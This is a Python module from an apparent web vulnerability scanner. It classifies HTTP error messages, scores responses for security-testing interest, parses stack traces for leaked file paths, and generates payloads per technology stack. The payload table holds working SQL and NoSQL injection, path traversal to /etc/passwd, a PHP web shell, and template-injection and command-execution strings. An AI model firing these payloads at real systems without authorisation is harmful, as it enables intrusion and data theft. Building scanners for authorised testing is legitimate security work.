"""
NLP-Based Vulnerability Detector — Classify HTTP responses to identify
vulnerability indicators using pattern-based NLP analysis.

Capabilities:
  1. Error Message Classification — categorize errors (database, code,
     network, filesystem, auth) with confidence scoring
  2. Response Interest Scoring — rate how "interesting" a response is
     for security testing (0.0 = boring, 1.0 = highly interesting)
  3. Semantic Payload Generation — context-aware payload mutations
     tailored to the detected technology stack
  4. Stack Trace Detection — parse multi-language stack traces and
     extract sensitive file paths / internal identifiers
"""
from __future__ import annotations

import re
import logging

logger = logging.getLogger(__name__)

# ── Error category patterns ────────────────────────────────────────────────────

_DB_PATTERNS = re.compile(
    r'(ORA-\d{5}|mysql.*error|pg_query|pg_exec|psql|sqlite[23]?'
    r'|SQLSTATE\[|Warning:.*mysql_|MySQLi?Exception|'
    r'Unclosed\s+quotation\s+mark|syntax\s+error.*SQL'
    r'|java\.sql\.|javax\.persistence\.|HibernateException'
    r'|MongoError|MongoServerError|CouchDB\s+error'
    r'|Redis.*error|FATAL.*database)',
    re.I,
)

_CODE_PATTERNS = re.compile(
    r'(Traceback\s*\(most\s*recent\s*call\s*last\)'
    r'|Unhandled\s*(Exception|Error)'
    r'|NullPointerException|ArrayIndexOutOfBoundsException'
    r'|ClassNotFoundException|StackOverflowError'
    r'|RuntimeException|IllegalArgumentException'
    r'|System\..*Exception|Microsoft\..*Exception'
    r'|TypeError:|ReferenceError:|SyntaxError:'
    r'|Fatal\s+error:|Parse\s+error:|Warning:\s+\w+\(\)'
    r'|undefined.*is not|Cannot\s+read\s+propert)'
    ,
    re.I,
)

_NETWORK_PATTERNS = re.compile(
    r'(Connection\s+refused|Connection\s+timed\s+out'
    r'|ECONNREFUSED|ECONNRESET|ETIMEDOUT'
    r'|Network\s+is\s+unreachable|Host\s+not\s+found'
    r'|getaddrinfo\s+fail|dial\s+tcp.*refused'
    r'|socket.*error|WSAENOT)',
    re.I,
)

_FILESYSTEM_PATTERNS = re.compile(
    r'(Permission\s+denied|No\s+such\s+file\s+or\s+directory'
    r'|ENOENT|EACCES|EPERM'
    r'|open\(.*\):\s+No\s+such\s+file'
    r'|fopen\(|file_get_contents\('
    r'|cannot\s+open\s+file|failed\s+to\s+open\s+stream'
    r'|/etc/passwd|/etc/shadow|C:\\\\Windows\\\\|C:/Windows/)',
    re.I,
)

_AUTH_PATTERNS = re.compile(
    r'(Access\s+denied|Unauthorized|Invalid\s+(token|credentials?|password)'
    r'|Authentication\s+(failed|required|error)'
    r'|CSRF\s+(token|verification)\s+(mismatch|fail)'
    r'|Forbidden|403\s+Forbidden|401\s+Unauthorized'
    r'|session\s+(expired|invalid|not\s+found)'
    r'|JWT.*invalid|signature\s+verification\s+failed)',
    re.I,
)

_CATEGORY_MAP = [
    ('database',   _DB_PATTERNS,         'high'),
    ('code',       _CODE_PATTERNS,       'high'),
    ('filesystem', _FILESYSTEM_PATTERNS, 'high'),
    ('auth',       _AUTH_PATTERNS,       'medium'),
    ('network',    _NETWORK_PATTERNS,    'low'),
]

# ── Interest scoring signals ───────────────────────────────────────────────────

_STATUS_WEIGHTS = {
    500: 0.90, 503: 0.70, 502: 0.65, 501: 0.55,
    403: 0.50, 401: 0.45, 405: 0.35, 422: 0.40,
    418: 0.30, 301: 0.10, 302: 0.10, 200: 0.05,
}

_INTERESTING_KEYWORDS = re.compile(
    r'(password|secret|token|api[_-]?key|private[_-]?key'
    r'|internal[_-]?server|debug|stacktrace|traceback'
    r'|exception|root|sudo|uid=0|/etc/|C:/Windows'
    r'|AWS_SECRET|PRIVATE\s+KEY|BEGIN\s+RSA)',
    re.I,
)

# ── Stack trace patterns (per language) ──────────────────────────────────────

_STACK_PATTERNS = {
    'python': re.compile(
        r'Traceback\s*\(most\s*recent\s*call\s*last\).*?(?=\n\S|\Z)',
        re.S,
    ),
    'java': re.compile(
        r'(java\.\w+\.\w+Exception[^\n]*\n(?:\s+at\s+[\w.$<>]+\([^)]*\)\n)*)',
        re.S,
    ),
    'javascript': re.compile(
        r'((?:Error|TypeError|ReferenceError)[^\n]*\n(?:\s+at\s+[^\n]+\n)*)',
        re.S,
    ),
    'php': re.compile(
        r'((?:Fatal|Parse|Warning):\s+[^\n]+\n(?:Stack\s+trace:\n(?:#\d+\s+[^\n]+\n)*))',
        re.S,
    ),
    'ruby': re.compile(
        r'([^\n]+\.rb:\d+:in\s+`[^\']+\'[^\n]*\n(?:\s+from\s+[^\n]+\n)*)',
        re.S,
    ),
    'dotnet': re.compile(
        r'((?:System|Microsoft)\.\w+(?:\.\w+)*Exception[^\n]*\n(?:\s+at\s+[^\n]+\n)*)',
        re.S,
    ),
}

_FILE_PATH_RE = re.compile(
    r'([A-Za-z]:\\[\w\\.\-]+|/(?:home|etc|var|usr|opt|srv|app|root|tmp)'
    r'[\w/.\-]+|[\w/.\-]+\.(?:py|rb|php|java|cs|js|go|rs)\b)',
)

# ── Tech-specific payload contexts ────────────────────────────────────────────

_TECH_PAYLOAD_MUTATIONS: dict[str, list[str]] = {
    'php': [
        '{base}', '{base}%00', '{base}/../../../etc/passwd',
        "' OR 1=1--", '{base}<?php system($_GET[cmd]);?>',
        '{base}.php', '{base};ls',
    ],
    'java': [
        '{base}', '{base}%0a', '{base}/../WEB-INF/web.xml',
        '${7*7}', '#{7*7}', '{base}%3B',
        '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
    ],
    'aspnet': [
        '{base}', '{base}%00', '{base}/../web.config',
        "' OR 1=1--", '@(7*7)', '{base};dir',
    ],
    'python': [
        '{base}', '{base}\x00', '{{7*7}}', '{{config}}',
        '__import__("os").popen("id").read()',
        '{base}/../../../etc/passwd',
    ],
    'nodejs': [
        '{base}', '{base}\x00', '{"$gt":""}', '{"$where":"sleep(5000)"}',
        '{base}/../../../etc/passwd', 'require("child_process").execSync("id")',
    ],
    'ruby': [
        '{base}', '{base}/../../../etc/passwd',
        "<%= 7*7 %>", "<% `id` %>", '{base}%00',
    ],
    'default': [
        '{base}', '{base}%00', '{base}/', '../{base}',
        '{base}/../../../etc/passwd', "' OR '1'='1", '/dev/null',
    ],
}


# ── Public API ────────────────────────────────────────────────────────────────

def classify_error_message(text: str) -> dict:
    """Classify an error message into a category.

    Returns:
        {
            'category': str,      # database/code/filesystem/auth/network/harmless
            'confidence': float,  # 0.0–1.0
            'indicators': list,   # matched strings
            'severity': str,      # info/low/medium/high/critical
        }
    """
    if not text:
        return {'category': 'harmless', 'confidence': 1.0, 'indicators': [], 'severity': 'info'}

    best_category = 'harmless'
    best_confidence = 0.0
    best_severity = 'info'
    all_indicators: list[str] = []

    for category, pattern, severity in _CATEGORY_MAP:
        matches = pattern.findall(text)
        if matches:
            flat = [m if isinstance(m, str) else m[0] for m in matches]
            confidence = min(0.50 + 0.15 * len(flat), 0.98)
            if confidence > best_confidence:
                best_category = category
                best_confidence = confidence
                best_severity = severity
                all_indicators = flat[:5]

    return {
        'category': best_category,
        'confidence': round(best_confidence, 3),
        'indicators': all_indicators,
        'severity': best_severity,
    }


def score_response_interest(response: dict) -> float:
    """Score how interesting a response is for security testing.

    Args:
        response: dict with status_code, text, length, elapsed

    Returns:
        float 0.0–1.0 (higher = more interesting)
    """
    scores: list[float] = []

    # Status code signal
    status = response.get('status_code', 200)
    scores.append(_STATUS_WEIGHTS.get(status, 0.05))

    # Error message category
    text = response.get('text', '') or ''
    error_info = classify_error_message(text)
    cat = error_info['category']
    if cat in ('database', 'code', 'filesystem'):
        scores.append(0.85)
    elif cat == 'auth':
        scores.append(0.55)
    elif cat == 'network':
        scores.append(0.35)
    else:
        scores.append(0.0)

    # Interesting keywords
    kw_count = len(_INTERESTING_KEYWORDS.findall(text))
    scores.append(min(kw_count * 0.15, 0.75))

    # Response length anomaly (unusually long or short)
    length = response.get('length', len(text))
    if length > 50_000:
        scores.append(0.4)
    elif length < 50 and status == 200:
        scores.append(0.3)
    else:
        scores.append(0.0)

    # Time-based signal (potential blind injection)
    elapsed = response.get('elapsed', 0.0)
    if elapsed > 5.0:
        scores.append(0.8)
    elif elapsed > 3.0:
        scores.append(0.5)
    else:
        scores.append(0.0)

    # Stack trace found
    trace = detect_stack_trace(text)
    if trace['detected']:
        scores.append(0.90)
    else:
        scores.append(0.0)

    return round(min(max(sum(scores) / len(scores), 0.0), 1.0), 3)


def generate_contextual_payloads(base_payload: str, context: dict) -> list[str]:
    """Generate technology-specific payload mutations.

    Args:
        base_payload: the original payload string
        context: dict with 'tech_stack' key (php/java/aspnet/python/nodejs/ruby)

    Returns:
        list of mutated payload strings
    """
    tech = (context.get('tech_stack', '') or 'default').lower().strip()

    # Normalise common variations
    if tech in ('asp', 'asp.net', 'iis'):
        tech = 'aspnet'
    elif tech in ('node', 'node.js', 'express'):
        tech = 'nodejs'
    elif tech in ('django', 'flask', 'fastapi'):
        tech = 'python'

    mutations = _TECH_PAYLOAD_MUTATIONS.get(tech, _TECH_PAYLOAD_MUTATIONS['default'])
    return [m.replace('{base}', base_payload) for m in mutations]


def detect_stack_trace(text: str) -> dict:
    """Detect and parse a stack trace in an HTTP response body.

    Returns:
        {
            'detected': bool,
            'language': str,        # python/java/javascript/php/ruby/dotnet/unknown
            'frames': list[dict],   # [{file, line, function}, ...]
            'sensitive_paths': list[str],
        }
    """
    if not text:
        return {'detected': False, 'language': 'unknown', 'frames': [], 'sensitive_paths': []}

    for lang, pattern in _STACK_PATTERNS.items():
        match = pattern.search(text)
        if match:
            trace_text = match.group(0)
            frames = _extract_frames(lang, trace_text)
            paths = _FILE_PATH_RE.findall(trace_text)
            return {
                'detected': True,
                'language': lang,
                'frames': frames,
                'sensitive_paths': list(dict.fromkeys(paths))[:10],
            }

    return {'detected': False, 'language': 'unknown', 'frames': [], 'sensitive_paths': []}


# ── Frame extraction helpers ──────────────────────────────────────────────────

_PYTHON_FRAME_RE = re.compile(
    r'File "([^"]+)", line (\d+), in (\S+)'
)
_JAVA_FRAME_RE = re.compile(
    r'at ([\w.$<>]+)\(([^:)]+):?(\d*)\)'
)
_JS_FRAME_RE = re.compile(
    r'at (\S+)\s+\(([^)]+):(\d+):\d+\)'
)
_PHP_FRAME_RE = re.compile(
    r'#\d+\s+([^(]+)\((\d+)\):\s+(\S+)'
)
_RUBY_FRAME_RE = re.compile(
    r'from ([^:]+):(\d+):in\s+`([^\']+)\''
)
_DOTNET_FRAME_RE = re.compile(
    r'at\s+([\w.<>]+)\(([^)]*)\)\s+in\s+([^:]+):line\s+(\d+)'
)


def _extract_frames(lang: str, trace_text: str) -> list[dict]:
    frames = []
    if lang == 'python':
        for m in _PYTHON_FRAME_RE.finditer(trace_text):
            frames.append({'file': m.group(1), 'line': int(m.group(2)), 'function': m.group(3)})
    elif lang == 'java':
        for m in _JAVA_FRAME_RE.finditer(trace_text):
            frames.append({'file': m.group(2), 'line': int(m.group(3)) if m.group(3) else 0, 'function': m.group(1)})
    elif lang == 'javascript':
        for m in _JS_FRAME_RE.finditer(trace_text):
            frames.append({'file': m.group(2), 'line': int(m.group(3)), 'function': m.group(1)})
    elif lang == 'php':
        for m in _PHP_FRAME_RE.finditer(trace_text):
            frames.append({'file': m.group(1).strip(), 'line': int(m.group(2)), 'function': m.group(3)})
    elif lang == 'ruby':
        for m in _RUBY_FRAME_RE.finditer(trace_text):
            frames.append({'file': m.group(1), 'line': int(m.group(2)), 'function': m.group(3)})
    elif lang == 'dotnet':
        for m in _DOTNET_FRAME_RE.finditer(trace_text):
            frames.append({'file': m.group(3), 'line': int(m.group(4)), 'function': m.group(1)})
    return frames[:20]
